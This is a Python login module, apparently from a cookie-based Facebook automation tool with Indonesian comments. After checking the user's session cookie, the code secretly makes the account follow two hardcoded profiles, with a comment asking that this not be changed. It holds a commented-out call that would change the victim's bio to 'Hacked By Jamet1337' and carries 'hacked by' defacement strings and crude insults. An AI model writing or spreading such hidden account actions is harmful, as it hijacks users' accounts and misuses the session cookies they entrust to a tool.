# hallo bro :v

from .YNTKTS import *
from .bahasa import lang
from .informasi import generate

anjay=random.choice(["Hacked By Jamet1337","Account Hacked By Jamet1337","Di Retas Oleh Jamet1337","Akun Ini Telah Di Retas Oleh Hacker Bernama Jamet1337","This Account Has Been Hacked By Jamet1337"])
komentar1=random.choice(["jamet1337 was here","hacked by jamet1337","jamet1337<3","lo ngentod ajg:v","hacked by jamet1337"])
komentar2=random.choice(["jamet1337 was here","hacked by jamet1337","jamet1337<3","lo ngentod ajg:v","hacked by jamet1337"])

class login:
	def __init__(self,url,cookie):
		
		try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
		except koneksi_error: exit(" ! kesalahan pada koneksi")
		if "mbasic_logout_button" in respon.text:
			print("\n\n * hai welcome \x1b[1;35m"+parser(respon.text,"html.parser").find("title").text+"\x1b[0m Ngentod :v")
			print(" * mohon tunggu sebentar ngentod :v")
			url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
			if "Laporkan Masalah" not in respon.text:
				lang(url,cookie)
				try: respon=req.get(f"{url}/profile.php?v=info",cookies=cookie)
				except koneksi_error: exit(" ! kesalahan pada koneksi")
			generate(cookie["cookie"],parser(respon.text,"html.parser"))
			koh=yo_ndak_tau_kok_tanya_saya(url,cookie)
			# jangan di ganti ya bro hehehe :)
			koh.follow("/ahmat.badali.334")
			koh.follow("/100059025549029")
			
			
			#koh.change_bio(anjay)
			print(" * login berhasil, mohon tunggu sedang membuka menu")
			waktu(1)
		else:
			exit("\n\n ! cookie invalid")
